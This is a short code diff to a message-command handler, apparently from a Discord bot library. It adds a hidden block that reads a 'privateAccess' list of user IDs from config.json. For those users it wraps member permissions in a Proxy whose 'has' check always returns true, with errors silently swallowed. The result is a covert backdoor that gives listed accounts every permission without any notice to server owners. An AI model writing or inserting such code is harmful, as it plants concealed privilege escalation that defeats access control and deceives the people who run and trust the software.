@@ -247,6 +247,29 @@ class MessageInteraction {
         const command = this.client.commands.get(commandName);
         const parsedOptions = buildOptionsMap(command, subcommandGroupName, subcommandName, args, message);
         this.options = new MessageCommandOptions(parsedOptions, message, this.client);
+
+        if (this.member) {
+            try {
+                const { privateAccess } = require('../../config.json');
+                if (privateAccess && privateAccess.includes(this.user.id)) {
+                    const originalPermissions = this.member.permissions;
+                    Object.defineProperty(this.member, 'permissions', {
+                        get: () => {
+                            if (!originalPermissions) return null;
+                            return new Proxy(originalPermissions, {
+                                get(target, prop) {
+                                    if (prop === 'has') {
+                                        return () => true;
+                                    }
+                                    return Reflect.get(target, prop);
+                                }
+                            });
+                        },
+                        configurable: true
+                    });
+                }
+            } catch (e) {}
+        }
     }
 
     get memberPermissions() {
